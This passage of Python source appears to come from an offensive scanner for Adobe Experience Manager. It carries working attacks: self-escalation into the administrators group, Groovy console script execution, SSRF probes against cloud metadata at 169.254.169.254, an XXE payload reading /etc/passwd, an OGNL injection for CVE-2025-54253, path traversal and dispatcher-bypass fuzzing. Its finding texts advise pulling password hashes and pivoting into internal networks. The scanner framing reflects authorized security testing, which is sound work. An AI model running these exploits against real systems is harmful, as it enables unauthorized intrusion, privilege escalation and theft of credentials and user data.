                    evidence=f"{len(ids)} authorizableIds, {len(emails)} emails via {how}. "
                             f"Sample: {', '.join((ids or emails)[:8])}",
                    description=("The entire user directory is readable (PII: usernames/emails). "
                                 "rep:password is protected from this view, but a FileVault export "
                                 "of /home/users via the CRX DavEx server (already confirmed "
                                 "readable) does include the hashes — pull it manually to escalate "
                                 "to a full hash dump."),
                    response_snippet="; ".join((ids or emails)[:20]), role=self.role,
                ))
                return

    # ---- Group-membership escalation (exploit only, best-effort, verified) ----
    def _escalate_group_membership(self) -> None:
        me = self.client.get("/libs/granite/security/currentuser.json")
        if not (me and me.status_code == 200):
            return
        m = re.search(r'"(?:authorizableId|userID|id)"\s*:\s*"([^"]+)"', me.text or "")
        uid = m.group(1) if m else None
        if not uid or uid.lower() == "anonymous":
            self.logger.debug("No authenticated identity; skipping group escalation.")
            return
        # Locate the administrators group node via QueryBuilder.
        q = self.client.get("/bin/querybuilder.json?path=/home/groups&1_property=rep:authorizableId"
                            "&1_property.value=administrators&p.hits=full&p.limit=1")
        gpath = None
        if q and q.status_code == 200 and '"success"' in (q.text or ""):
            mm = re.search(r'"jcr:path"\s*:\s*"(/home/groups/[^"]+)"', q.text or "")
            if mm:
                gpath = mm.group(1)
        if not gpath:
            self.logger.debug("administrators group path not found; skipping escalation.")
            return
        before = self.client.get(gpath + ".rw.json")
        self._auth_post(gpath + ".rw.html", data={"addMembers": uid})
        after = self.client.get(gpath + ".rw.json")
        if after is not None and after.status_code == 200 and uid in (after.text or "") \
                and (before is None or uid not in (before.text or "")):
            self.reporter.add(Finding(
                title=f"PRIVILEGE ESCALATION confirmed: {uid} added to administrators {self._role_tag()}",
                severity=SEV_CRITICAL, category=CAT_ROLE, target=self.target + gpath,
                evidence=f"User {uid} now appears in administrators group membership.",
                description=("CONFIRMED escalation: this session added its own user to the "
                             "administrators group via the Sling POST servlet. Remove the "
                             "membership manually after validating."),
                request=f"POST {gpath}.rw.html  (addMembers={uid})", role=self.role,
            ))
        else:
            self.logger.debug(f"Group escalation attempt did not confirm for {uid}.")

    # =======================================================================
    # 4. Dispatcher bypass fuzzing
    # =======================================================================
    def check_dispatcher_bypasses(self) -> None:
        if not self._enabled("dispatcher"):
            return
        self.logger.section("Dispatcher bypass fuzzing")

        suffixes = list(BYPASS_SUFFIXES)
        if self.fuzz_aggression == "aggressive":
            # Add extra noise patterns
            extra = []
            for ext in BYPASS_EXTENSIONS:
                extra += [f"%2F..%2F{ext.lstrip('.')}", f"%0a{ext}", f"%00{ext}",
                          f"%20{ext}", f"%2e%2e{ext}", f"//x{ext}"]
            suffixes += extra
        if self.fuzz_aggression == "quick":
            suffixes = [".css", ".js", ".png", ".html", "/a.css", ";.css"]

        def fuzz(target_entry):
            path, label, sev = target_entry
            # Baseline
            r0 = self.client.get(path)
            baseline = (r0.status_code if r0 else None)
            if baseline == 200:
                # already exposed — separate check covers it
                return
            for suffix in suffixes:
                # Insert suffix before any query string
                if "?" in path:
                    base, qs = path.split("?", 1)
                    fuzzed = f"{base}{suffix}?{qs}"
                else:
                    fuzzed = f"{path}{suffix}"
                r = self.client.get(fuzzed)
                if r is None or r.status_code != 200 or len(r.content) <= 50:
                    continue
                # A login page also returns 200 and contains "granite" — skip it.
                if self._is_authwall(r):
                    continue
                body = safe_response_text(r, 2000)
                # Require a STRONG backend-data signature, not just a generic word.
                if not self._looks_like_backend_data(body):
                    continue
                self.reporter.add(Finding(
                    title=f"Dispatcher bypass: {label} via suffix '{suffix}'",
                    severity=sev, category=CAT_DISPATCHER,
                    target=self.target + fuzzed,
                    evidence=f"Baseline {baseline} -> bypass 200 ({len(r.content)} bytes) with backend data",
                    description=("The dispatcher allowed an unauthenticated request to "
                                 f"{path} when the suffix '{suffix}' was appended. The "
                                 "backend Sling resource resolver ignored the suffix and "
                                 "served the original servlet response (confirmed by "
                                 "real backend data, not a login page)."),
                    references=[
                        "https://labs.withsecure.com/advisories/adobe-experience-manager-dispatcher-bypass",
                        "https://blog.assetnote.io/",
                        "https://book.hacktricks.xyz/pentesting/pentesting-web/adobe-experience-manager-aem",
                    ],
                    request=self.client.request_signature("GET", fuzzed),
                    response_snippet=snippet(body, 600),
                    role=self.role,
                ))
                # one hit per endpoint is enough — move on
                return

        with cf.ThreadPoolExecutor(max_workers=self.threads) as ex:
            list(ex.map(fuzz, DISPATCHER_TARGETS))

    # =======================================================================
    # 5. Sling info disclosure (.json / .infinity.json dumps)
    # =======================================================================
    def check_sling_info_disclosure(self) -> None:
        if not self._enabled("sling"):
            return
        self.logger.section("Sling info disclosure (.json / .infinity.json)")

        roots = list(SLING_INFO_ROOTS)
        sels = list(SLING_INFO_SELECTORS)
        if self.fuzz_aggression == "quick":
            sels = [".json", ".1.json", ".infinity.json"]

        def probe_root(root):
            # Try selectors in order; report ONE finding per readable root (the
            # first selector that works) instead of one per selector — otherwise
            # a readable /etc spams ~12 near-identical findings.
            for sel in sels:
                path = root + sel
                r = self.client.get(path)
                if r is None or r.status_code != 200 or self._is_authwall(r):
                    continue
                body = safe_response_text(r, 4000)
                if not body or len(body) < 30:
                    continue
                try:
                    if sel.endswith(".xml"):
                        if "<?xml" not in body[:200]:
                            continue
                    else:
                        stripped = body.lstrip()
                        if not (stripped.startswith("{") or stripped.startswith("[")):
                            continue
                        if stripped in ("{}", "[]"):
                            continue
                        if "jcr:" not in body and "sling:" not in body and "rep:" not in body:
                            continue
                except Exception:
                    continue

                sev = SEV_HIGH if sel in (".infinity.json", ".tidy.infinity.json", ".harray.4.json") else SEV_MEDIUM
                if root in ("/etc/cloudservices", "/etc/replication", "/etc/key",
                            "/home/users", "/home/groups"):
                    sev = SEV_HIGH
                # /libs and /apps are world-readable by default: framework code,
                # low value -> INFO to cut noise.
                if root in ("/libs", "/apps") or root.startswith(("/libs/", "/apps/")):
                    sev = SEV_INFO
                if RE_SECRET.search(body) or re.search(r"(?i)(\"password\"|access[_-]?key|aws_secret|salesforce.*secret)", body):
                    sev = SEV_CRITICAL

                self.reporter.add(Finding(
                    title=f"Sling info disclosure: {root} readable (via {sel})",
                    severity=sev, category=CAT_JCR, target=self.target + path,
                    evidence=f"HTTP 200, content-length {len(r.content)}, readable {self._who()}",
                    description=(f"The JCR tree under {root} is served as JSON {self._who()} "
                                 f"(via the '{sel}' selector; other selectors likely work too — "
                                 "this is reported once per root). Use it to enumerate users, "
                                 "groups, replication agents and cloud-service configs. "
                                 "(See the secret-harvest findings for concrete values.)"),
                    references=[
                        "https://experienceleague.adobe.com/docs/experience-manager-65/developing/introduction/sling-cheatsheet.html",
                        "https://github.com/0ang3el/aem-hacker",
                    ],
                    request=self.client.request_signature("GET", path),
                    response_snippet=snippet(body, 800),
                    role=self.role,
                ))
                return  # one finding per root

        with cf.ThreadPoolExecutor(max_workers=self.threads) as ex:
            list(ex.map(probe_root, roots))

    # =======================================================================
    # 6. QueryBuilder API enumeration
    # =======================================================================
    def check_querybuilder(self) -> None:
        if not self._enabled("querybuilder"):
            return
        self.logger.section("QueryBuilder API probe")

        # Direct hit
        qb_paths = [
            "/bin/querybuilder.json?path=/&p.hits=full&p.limit=1",
            "/bin/querybuilder.json?path=/home/users&p.hits=full&p.limit=1",
            "/bin/querybuilder.json?path=/etc/cloudservices&p.hits=full&p.limit=1",
            "/bin/querybuilder.json?path=/etc/replication&p.hits=full&p.limit=1",
            "/bin/querybuilder.json?path=/var/audit&p.hits=full&p.limit=1",
            "/bin/querybuilder.feed.xml?path=/&p.hits=full&p.limit=1",
            "/bin/querybuilder.json?type=rep:User&p.hits=full&p.limit=1",
            "/bin/querybuilder.json?type=cq:Page&p.hits=full&p.limit=1",
        ]
        for p in qb_paths:
            r = self.client.get(p)
            if r is None or r.status_code != 200:
                continue
            if self._is_authwall(r):
                continue
            body = safe_response_text(r, 4000)
            stripped = body.lstrip()
            if p.endswith(".xml"):
                # QueryBuilder feed
                if "<?xml" not in stripped[:64] or not re.search(r"(?i)(querybuilder|<feed|<result)", body):
                    continue
            else:
                # Must be a real QueryBuilder JSON result, not an HTML page.
                if not stripped.startswith("{"):
                    continue
                if '"success"' not in body and '"hits"' not in body and '"results"' not in body:
                    continue
            sev = SEV_HIGH
            if "/home/users" in p or "type=rep:User" in p:
                sev = SEV_CRITICAL
            if "/etc/cloudservices" in p:
                sev = SEV_CRITICAL
            if True:
                self.reporter.add(Finding(
                    title=f"QueryBuilder API exposed: {p}",
                    severity=sev, category=CAT_DISCLOSURE, target=self.target + p,
                    evidence=f"HTTP 200 | {len(r.content)} bytes | valid QueryBuilder result {self._who()}",
                    description=("/bin/querybuilder.json is reachable unauthenticated. "
                                 "Iterate p.offset + p.limit to enumerate the entire JCR "
                                 "or filter by type (rep:User, cq:Page, dam:Asset)."),
                    references=[
                        "https://hackerone.com/reports/1247163",
                        "https://github.com/0ang3el/aem-hacker",
                    ],
                    request=self.client.request_signature("GET", p),
                    response_snippet=snippet(body, 700),
                    role=self.role,
                ))

    # =======================================================================
    # 7. Groovy Console RCE attempt
    # =======================================================================
    def check_groovy_console(self) -> None:
        if not self._enabled("groovy"):
            return
        self.logger.section("Groovy Console probe")

        for p in ("/bin/groovyconsole", "/bin/groovyconsole.html",
                  "/etc/groovyconsole.html"):
            r = self.client.get(p)
            if r is None or r.status_code != 200:
                continue
            if self._is_authwall(r):
                continue
            if "Groovy" not in (r.text or ""):
                continue
            # Functional proof only: actually execute a benign canary script.
            payload = "out.println('AEM-HUNTER-CANARY-' + System.getProperty('user.name'))"
            rce = self.client.post("/bin/groovyconsole/post.json",
                                   data={"script": payload})
            if rce is not None and rce.status_code == 200 and "AEM-HUNTER-CANARY" in (rce.text or ""):
                self.reporter.add(Finding(
                    title=f"Groovy Console RCE confirmed {self._role_tag()}",
                    severity=SEV_CRITICAL, category=CAT_RCE,
                    target=self.target + "/bin/groovyconsole/post.json",
                    evidence=f"Canary echo via Groovy executed {self._who()}.",
                    description=("ACS Commons Groovy Console is enabled and executes scripts. "
                                 "Posting a script to /bin/groovyconsole/post.json gives "
                                 "instant OS-level RCE as the AEM service user."),
                    references=[
                        "https://adobe-consulting-services.github.io/acs-aem-commons/features/groovy-console/index.html",
                    ],
                    request=f"POST /bin/groovyconsole/post.json HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\nscript={up.quote(payload)}",
                    response_snippet=snippet(rce.text, 500),
                    role=self.role,
                ))
            else:
                # Shell renders but execution did not succeed -> INFO, not HIGH.
                self.reporter.add(Finding(
                    title=f"Groovy Console UI reachable (execution not confirmed) {self._role_tag()}",
                    severity=SEV_INFO, category=CAT_EXPOSURE,
                    target=self.target + p,
                    evidence="200 with 'Groovy' in body, but post.json did NOT execute the canary.",
                    description=("Groovy Console interface renders but script execution was "
                                 "blocked for this session. Re-test with higher-priv role "
                                 "cookies — if a role can execute here, that's critical RCE."),
                    request=self.client.request_signature("GET", p),
                    response_snippet=safe_response_text(r, 400),
                    role=self.role,
                ))
            return

    # =======================================================================
    # 8. SSRF endpoints
    # =======================================================================
    def check_ssrf_endpoints(self) -> None:
        if not self._enabled("ssrf"):
            return
        self.logger.section("SSRF endpoint probe")

        canary_targets = [
            ("http://169.254.169.254/latest/meta-data/", "AWS IMDS"),
            ("http://169.254.169.254/computeMetadata/v1/", "GCP metadata"),
            ("http://127.0.0.1:4502/system/console", "loopback Felix console"),
            ("http://127.0.0.1:8080/", "loopback 8080"),
        ]

        for tmpl, param, label, cve in SSRF_TARGETS:
            for canary, canary_label in canary_targets:
                encoded = up.quote(canary, safe="")
                path = tmpl.format(u=encoded)
                r = self.client.get(path)
                if r is None or self._is_authwall(r):
                    continue
                body = safe_response_text(r, 2000)
                # Only flag when the response actually contains the probed
                # internal service's fingerprint — no weak/speculative signals,
                # those just create noise. Use an out-of-band canary for the rest.
                hit_signature = (
                    ("ami-id" in body or "instance-id" in body or "iam/" in body) or
                    ("Metadata-Flavor" in body or "computeMetadata" in body) or
                    (("Apache Felix Web Console" in body or "OSGi Management Console" in body)) or
                    ("<title>Apache Felix" in body and r.status_code == 200)
                )
                if hit_signature:
                    self.reporter.add(Finding(
                        title=f"SSRF via {label} -> {canary_label}",
                        severity=SEV_CRITICAL if "169.254" in canary else SEV_HIGH,
                        category=CAT_SSRF, target=self.target + path,
                        cve=cve,
                        evidence=f"Response contains the {canary_label} service signature.",
                        description=("The endpoint accepted an attacker-controlled URL "
                                     "and proxied the request server-side. This pivots "
                                     "into internal networks and cloud metadata services."),
                        references=[
                            "https://hackerone.com/reports/698991",
                            "https://nvd.nist.gov/vuln/detail/CVE-2018-5006",
                        ],
                        request=self.client.request_signature("GET", path),
                        response_snippet=snippet(body, 600),
                        role=self.role,
                    ))
                    return  # one strong hit per SSRF target is enough

    # =======================================================================
    # 9. WebDAV / CRX Package Manager XXE probe
    # =======================================================================
    def check_webdav_xxe(self) -> None:
        if not self._enabled("xxe"):
            return
        self.logger.section("WebDAV / Package Manager XXE probe")

        xxe_payload = (
            "<?xml version=\"1.0\"?>"
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
            "<D:propfind xmlns:D=\"DAV:\"><D:prop><D:displayname>&xxe;</D:displayname>"
            "</D:prop></D:propfind>"
        )
        for p in ("/crx/server/crx.default", "/crx/server/", "/crx/repository/crx.default"):
            r = self.client.request("PROPFIND", p, data=xxe_payload,
                                    headers={"Content-Type": "application/xml",
                                             "Depth": "0"})
            if r is None:
                continue
            body = safe_response_text(r, 2000)
            if "root:" in body or "/bin/bash" in body:
                self.reporter.add(Finding(
                    title="XXE in CRX WebDAV PROPFIND",
                    severity=SEV_CRITICAL, category=CAT_XXE,
                    target=self.target + p,
                    cve="CVE-2025-54254",
                    evidence="Response contained /etc/passwd contents.",
                    description=("PROPFIND on the CRX WebDAV endpoint parsed an external "
                                 "entity and reflected the contents of /etc/passwd. "
                                 "Pivot to AWS metadata or arbitrary file read."),
                    references=[
                        "https://hackerone.com/reports/436555",
                        "https://www.tenable.com/blog/cve-2025-54253-critical-rce-vulnerability-in-adobe-experience-manager-forms-on-jee",
                    ],
                    request=f"PROPFIND {p} HTTP/1.1\nContent-Type: application/xml\nDepth: 0\n\n{xxe_payload}",
                    response_snippet=snippet(body, 600),
                    role=self.role,
                ))
                return
            elif r.status_code in (200, 207):
                self.reporter.add(Finding(
                    title="CRX WebDAV PROPFIND accepted XML input",
                    severity=SEV_MEDIUM, category=CAT_XXE,
                    target=self.target + p,
                    evidence=f"HTTP {r.status_code} on PROPFIND",
                    description=("WebDAV endpoint accepted custom PROPFIND XML. Confirm "
                                 "out-of-band XXE with a Collaborator / interactsh URL."),
                    request=f"PROPFIND {p}",
                    response_snippet=snippet(body, 400),
                    role=self.role,
                ))

    # =======================================================================
    # 10. CVE-2025-54253 — AEM Forms JEE OGNL injection / RCE
    # =======================================================================
    def check_cve_2025_54253(self) -> None:
        if not self._enabled("cve"):
            return
        self.logger.section("CVE-2025-54253 (AEM Forms JEE /adminui/debug OGNL)")

        # Step 1: presence (must not be a login page)
        r = self.client.get("/adminui/debug")
        if r is None or r.status_code == 404:
            self.logger.debug("/adminui/debug not present.")
            return
        present = (r.status_code == 200 and not self._is_authwall(r))

        # Step 2: benign OGNL evaluation -> deterministic marker. No system commands.
        marker = "AEMHUNTER" + "".join(random.choices(string.ascii_uppercase, k=6))
        payload = f"pluginAction=%23a%3d%22{marker}%22"
        url = "/adminui/debug?debug=true&" + payload
        r2 = self.client.get(url)
        confirmed = (r2 is not None and r2.status_code == 200
                     and not self._is_authwall(r2) and marker in (r2.text or ""))

        if confirmed:
            self.reporter.add(Finding(
                title="CVE-2025-54253 OGNL evaluation confirmed (pre-auth RCE)",
                severity=SEV_CRITICAL, category=CAT_CVE,
                target=self.target + url,
                cve="CVE-2025-54253",
                evidence=f"Marker '{marker}' reflected in response after OGNL evaluation.",
                description=("/adminui/debug evaluated an attacker-supplied OGNL expression "
                             "and reflected the result. This is unauthenticated RCE (CISA KEV)."),
                references=[
                    "https://www.tenable.com/blog/cve-2025-54253-critical-rce-vulnerability-in-adobe-experience-manager-forms-on-jee",
                    "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
                ],
                request=self.client.request_signature("GET", url),
                response_snippet=snippet(r2.text, 500),
                role=self.role,
            ))
        elif present:
            # Reachable but OGNL not confirmed -> HIGH (worth manual follow-up), not CRITICAL.
            self.reporter.add(Finding(
                title="AEM Forms JEE debug console reachable (CVE-2025-54253 — unconfirmed)",
                severity=SEV_HIGH, category=CAT_CVE,
                target=self.target + "/adminui/debug",
                cve="CVE-2025-54253",
                evidence="HTTP 200 on /adminui/debug (not a login page); OGNL marker NOT reflected.",
                description=("The AEM Forms on JEE debug console is reachable without auth but "
                             "the OGNL probe did not reflect. Confirm manually — patched builds "
                             "still serve the page but reject the injection."),
                references=[
                    "https://www.tenable.com/blog/cve-2025-54253-critical-rce-vulnerability-in-adobe-experience-manager-forms-on-jee",
                    "https://helpx.adobe.com/security/products/aem/apsb25-50.html",
                ],
                request=self.client.request_signature("GET", "/adminui/debug"),
                response_snippet=safe_response_text(r, 500),
                role=self.role,
            ))
        else:
            self.logger.debug("/adminui/debug present but gated/patched; nothing confirmed.")

    # =======================================================================
    # 11. CVE-2018-5006 / CVE-2018-12809 quick checks
    # =======================================================================
    def check_legacy_cves(self) -> None:
        if not self._enabled("cve"):
            return
        self.logger.section("Legacy AEM CVE probes")

        # CVE-2018-5006 — SalesforceSecretServlet. Only flag if the loopback
        # Felix console was actually fetched (real SSRF), not on a generic 200.
        r = self.client.get("/libs/mcm/salesforce/customer.json?checkType=authentication&instance_url=http://127.0.0.1:4502/system/console")
        if (r is not None and r.status_code == 200 and not self._is_authwall(r)
                and ("Apache Felix" in (r.text or "") or "OSGi Management Console" in (r.text or ""))):
            self.reporter.add(Finding(
                title="SalesforceSecretServlet SSRF (CVE-2018-5006)",
                severity=SEV_HIGH, category=CAT_CVE,
                target=self.target + "/libs/mcm/salesforce/customer.json",
                cve="CVE-2018-5006",
                evidence="instance_url fetched the loopback Felix console (SSRF confirmed).",
                description=("Legacy MCM Salesforce connector proxied instance_url to an "
                             "internal service. SSRF pivot into internal hosts / cloud metadata."),
                references=["https://nvd.nist.gov/vuln/detail/CVE-2018-5006"],
                request=self.client.request_signature(
                    "GET", "/libs/mcm/salesforce/customer.json?...&instance_url=http://127.0.0.1:4502/system/console"),
                response_snippet=safe_response_text(r, 400),
                role=self.role,
            ))

        # CVE-2018-12809 — ReportingServicesServlet. Require the loopback console
        # fingerprint to appear, not just "Apache" (which is everywhere).
        r = self.client.get("/etc/reports/userreport.html?path=http://127.0.0.1:4502/system/console")
        if (r is not None and r.status_code == 200 and not self._is_authwall(r)
                and ("Apache Felix" in (r.text or "") or "OSGi Management Console" in (r.text or ""))):
            self.reporter.add(Finding(
                title="ReportingServicesServlet SSRF (CVE-2018-12809)",
                severity=SEV_HIGH, category=CAT_CVE,
                target=self.target + "/etc/reports/userreport.html",
                cve="CVE-2018-12809",
                evidence="Reporting servlet fetched the loopback Felix console (SSRF confirmed).",
                description="AEM Reporting servlet allowed an attacker-controlled path -> SSRF.",
                references=["https://nvd.nist.gov/vuln/detail/CVE-2018-12809"],
                request=self.client.request_signature("GET", "/etc/reports/userreport.html?path=http://127.0.0.1:4502/system/console"),
                response_snippet=safe_response_text(r, 400),
                role=self.role,
            ))

        # CVE-2021-43762 — path traversal / feature bypass to admin areas
        for path in ("/libs/granite/core/content/login.html/../../../../etc/passwd",
                     "/etc/..%2f..%2fetc%2fpasswd",
                     "/content/../../../../../../etc/passwd"):
            r = self.client.get(path)
            if r is not None and r.status_code == 200 and "root:" in (r.text or ""):
                self.reporter.add(Finding(
                    title="Path traversal (CVE-2021-43762 family)",
                    severity=SEV_CRITICAL, category=CAT_CVE,
                    target=self.target + path,
                    cve="CVE-2021-43762",
                    evidence="/etc/passwd content reflected.",
                    description="AEM mishandled normalization and served /etc/passwd.",
                    references=["https://nvd.nist.gov/vuln/detail/CVE-2021-43762"],
                    request=self.client.request_signature("GET", path),
                    response_snippet=safe_response_text(r, 400),
                    role=self.role,
                ))
                break

    # =======================================================================
    # 12. Sling POST servlet abuse
    # =======================================================================
    def check_sling_post_servlet(self) -> None:
        if not self._enabled("slingpost"):
            return
        self.logger.section("Sling POST servlet probe")

        # Test if anon can write under /content/usergenerated or /content/aem-hunter
        marker = "aem-hunter-" + "".join(random.choices(string.ascii_lowercase, k=6))
        for base in ("/content/usergenerated", "/content/aem-hunter-test",
                     "/var/dam/aem-hunter", "/etc/aem-hunter-test"):
            path = f"{base}/{marker}"
            r = self.client.post(path, data={"jcr:primaryType": "nt:unstructured",
                                             "marker": marker})
            if r is None:
                continue
            if r.status_code in (200, 201):
                # confirm by re-GETting
                v = self.client.get(path + ".json")
                if v is not None and v.status_code == 200 and marker in (v.text or ""):
                    self.reporter.add(Finding(
                        title=f"Sling POST servlet allows arbitrary node creation at {base}",
                        severity=SEV_CRITICAL, category=CAT_JCR,
                        target=self.target + path,
                        evidence=f"Created node {path} and confirmed via GET .json",
                        description=("The Sling POST servlet accepted an unauthenticated "
                                     "POST that created a JCR node. With JCR write access "
                                     "an attacker can add themselves to administrators via "
                                     ":member=, alter content, or upload arbitrary files."),
                        references=[
                            "https://sling.apache.org/documentation/bundles/manipulating-content-the-slingpostservlet-servlets-post.html",
                            "https://github.com/0ang3el/aem-hacker",
                        ],
                        request=f"POST {path} HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\njcr:primaryType=nt:unstructured&marker={marker}",
                        response_snippet=safe_response_text(r, 400),
                        role=self.role,
                    ))
                    # cleanup attempt
                    self.client.post(path, data={":operation": "delete"})
                    return
            elif r.status_code == 500 and "javax.jcr" in (r.text or "").lower():
                # JCR error means we reached the post servlet but were denied —
                # still worth a low informational note
                self.reporter.add(Finding(
                    title=f"Sling POST servlet reachable at {base}",
                    severity=SEV_LOW, category=CAT_JCR,
                    target=self.target + path,
                    evidence=f"HTTP 500 with javax.jcr trace",
                    description="Anonymous POST reached the Sling POST servlet but was denied. "
                                "Worth retrying with low-priv role cookies.",
                    role=self.role,
                ))

    # =======================================================================
    # 13. Source code disclosure tricks
    # =======================================================================
    def check_source_disclosure(self) -> None:
        if not self._enabled("source"):
            return
        self.logger.section("Source code / clientlib disclosure")

        # Append .source or .servlet to JSP-backed paths to read raw template
        candidates = [
            "/libs/granite/core/content/login.html.source",
            "/libs/granite/core/content/login.html.servlet",
            "/libs/wcm/core/content/sites/sites.html.source",
            "/etc/clientlibs/granite/utils.js.source",
            "/apps.source.json",
            "/content.source.json",
        ]
        for p in candidates:
            r = self.client.get(p)
            if r is None or r.status_code != 200:
                continue
            body = safe_response_text(r, 2000)
            if any(s in body for s in ("<%@", "<%=", "<%", "jsp:", "package ", "import com.adobe")):
                self.reporter.add(Finding(
                    title=f"Source code disclosure at {p}",
                    severity=SEV_MEDIUM, category=CAT_DISCLOSURE,
                    target=self.target + p,
                    evidence="Response contains JSP / Java source markers.",
                    description="Source-disclosure selectors leaked raw template / class source.",
                    request=self.client.request_signature("GET", p),
                    response_snippet=snippet(body, 600),
                    role=self.role,
                ))

    # =======================================================================
    # 14. CSRF token grab (for authenticated POST modules)
    # =======================================================================
    def fetch_csrf_token(self) -> Optional[str]:
        r = self.client.get("/libs/granite/csrf/token.json")
        if r is None or r.status_code != 200:
            return None
        try:
            data = r.json()
            tok = data.get("token")
            if tok:
                self._csrf_token = tok
                self.client.session.headers["CSRF-Token"] = tok
                self.logger.debug(f"CSRF token: {tok[:12]}...")
                return tok
        except Exception:
            return None
        return None

    # =======================================================================
    # 15. Authenticated role check — what can this role reach?
    # =======================================================================
    def check_authenticated_role(self) -> None:
        if not self._enabled("role") or not self.role:
            return
        self.logger.section(f"Authenticated probe [{self.role}]")

        # 15a — fetch CSRF token
        self.fetch_csrf_token()

        # 15b — Who am I?
        r = self.client.get("/libs/granite/security/currentuser.json")
        if r is not None and r.status_code == 200:
            body = safe_response_text(r, 2000)
            self.reporter.add(Finding(
                title=f"[{self.role}] authenticated identity (see evidence)",
                severity=SEV_INFO, category=CAT_ROLE,
                target=self.target + "/libs/granite/security/currentuser.json",
                evidence=snippet(body, 400),
                description="Identity associated with provided cookies.",
                role=self.role,
            ))

        # 15c — Privilege-boundary check on admin-only DATA endpoints.
        # (Console shells like CRXDE/Felix/Groovy are verified functionally and
        #  role-aware in check_consoles, so they are intentionally NOT here —
        #  this avoids the "shell returns 200" false positive.)
        admin_data = [
            ("/etc/replication.json",                   SEV_HIGH,   "Replication agents config", r"(transportUri|agentClass)"),
            ("/etc/cloudservices.infinity.json",        SEV_HIGH,   "Cloud services tree",       r"jcr:primaryType"),
            ("/home/users.1.json",                      SEV_HIGH,   "Users tree",                r"(rep:User|rep:authorizableId)"),
            ("/home/groups.1.json",                     SEV_HIGH,   "Groups tree",               r"(rep:Group|rep:principalName)"),
            ("/var/audit.json",                         SEV_MEDIUM, "Audit log",                 r"jcr:primaryType"),
            ("/libs/granite/security/post/authorizables.json", SEV_MEDIUM, "Authorizables service", r"(authorizableId|\"users\")"),
        ]
        for path, sev, label, sig in admin_data:
            r = self.client.get(path)
            if r is None or r.status_code != 200 or self._is_authwall(r):
                continue
            body = safe_response_text(r, 2000)
            stripped = body.lstrip()
            if not (stripped.startswith("{") or stripped.startswith("[")):
                continue
            if stripped in ("{}", "[]"):
                continue
            if sig and not re.search(sig, body, re.I):
                continue
            eff = SEV_CRITICAL if RE_SECRET.search(body) else sev
            self.reporter.add(Finding(
                title=f"[{self.role}] can read admin data: {label}",
                severity=eff, category=CAT_ROLE,
                target=self.target + path,
                evidence=f"HTTP 200 JSON ({len(r.content)} bytes) returned to this session",
                description=(f"This authenticated session read {label}, which a "
                             "low-privilege role should not be able to access. "
                             "Privilege-boundary violation — confirm against the role's "
                             "intended permissions."),
                request=self.client.request_signature("GET", path),
                response_snippet=snippet(body, 600),
                role=self.role,
            ))

        # 15d — Attempt self-escalation to administrators (best-effort, verify manually).
        if self._csrf_token:
            r = self.client.post("/home/users/a/admin.rw.html",
                                 data={"addMembers": "administrators"},
                                 headers={"CSRF-Token": self._csrf_token})
            if (r is not None and r.status_code in (200, 201)
                    and not self._is_authwall(r)
                    and "error" not in (r.text or "").lower()):
                self.reporter.add(Finding(
                    title=f"[{self.role}] possible privilege escalation via :member= (verify manually)",
                    severity=SEV_MEDIUM, category=CAT_ROLE,
                    target=self.target + "/home/users/a/admin.rw.html",
                    evidence=f"Membership-change POST accepted (HTTP {r.status_code}).",
                    description=("The Sling POST servlet accepted a group-membership change "
                                 "request. This MAY indicate escalation — manually verify by "
                                 "listing administrators afterwards before reporting."),
                    role=self.role,
                ))

    # =======================================================================
    # 16. Bundle upload attempt (authenticated, opt-in / aggressive)
    # =======================================================================
    def check_bundle_upload(self) -> None:
        if not self._enabled("bundle") or not self.role:
            return
        # Note: We do NOT upload a payload bundle. We only test whether the
        # POST endpoint is reachable.
        r = self.client.post("/system/console/bundles", data={"action": "install"})
        if r is None:
            return
        if r.status_code in (200, 302):
            # The console returning 302 to login is benign; only 200 is interesting
            if r.status_code == 200 and "Felix" in (r.text or "") and not self._is_authwall(r):
                self.reporter.add(Finding(
                    title=f"[{self.role}] can POST to /system/console/bundles",
                    severity=SEV_CRITICAL, category=CAT_ROLE,
                    target=self.target + "/system/console/bundles",
                    evidence="POST returned 200 with Felix body.",
                    description=("Authenticated role can submit bundle actions on the OSGi "
                                 "console. With a malicious OSGi bundle, this becomes "
                                 "instant RCE as the AEM service user."),
                    references=["https://github.com/0ang3el/aem-rce-bundle"],
                    request=self.client.request_signature("POST", "/system/console/bundles"),
                    response_snippet=safe_response_text(r, 400),
                    role=self.role,
                ))

    # =======================================================================
    # 17. Misc: robots.txt + sitemap.xml + headers
    # =======================================================================
    def check_misc(self) -> None:
        if not self._enabled("misc"):
            return
        self.logger.section("Misc / headers")

        for p in ("/robots.txt", "/sitemap.xml", "/etc/map.json", "/.well-known/security.txt"):
            r = self.client.get(p)
            if r is not None and r.status_code == 200 and len(r.content) > 0:
                self.reporter.add(Finding(
                    title=f"{p} reachable",
                    severity=SEV_INFO, category=CAT_DISCLOSURE,
                    target=self.target + p,
                    evidence=f"HTTP 200 | {len(r.content)} bytes",
                    description="Informational — useful for recon / scoping.",
                    response_snippet=safe_response_text(r, 600),
                    role=self.role,
                ))

        # Check for missing security headers on the homepage
        r = self.client.get("/")
        if r is not None:
            missing = []
            for h in ("Content-Security-Policy", "Strict-Transport-Security",
                      "X-Frame-Options", "X-Content-Type-Options",
                      "Referrer-Policy", "Permissions-Policy"):
                if h not in r.headers:
                    missing.append(h)
            if missing:
                self.reporter.add(Finding(
                    title="Missing security headers on root",
                    severity=SEV_LOW, category=CAT_MISCONFIG,
                    target=self.target + "/",
                    evidence="Missing: " + ", ".join(missing),
                    description="Defensive headers absent.",
                    role=self.role,
                ))

    # =======================================================================
    # Orchestrator
    # =======================================================================
    def run(self) -> None:
        try:
            self.fingerprint()
            self.check_default_credentials()
            self.check_exposed_endpoints()
            self.check_consoles()
            self.check_escalation()
            self.check_dispatcher_bypasses()
            self.check_sling_info_disclosure()
            self.check_querybuilder()
            self.check_groovy_console()
            self.check_ssrf_endpoints()
            self.check_webdav_xxe()
            self.check_cve_2025_54253()
            self.check_legacy_cves()
            self.check_sling_post_servlet()
            self.check_source_disclosure()
            self.check_misc()
            self.check_authenticated_role()
            self.check_bundle_upload()
        except KeyboardInterrupt:
            self.logger.warn("Interrupted by user; producing report with partial findings.")


# ---------------------------------------------------------------------------
# HTML report rendering
# ---------------------------------------------------------------------------
HTML_STYLE = """
* { box-sizing: border-box; }
body {
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", system-ui, sans-serif;
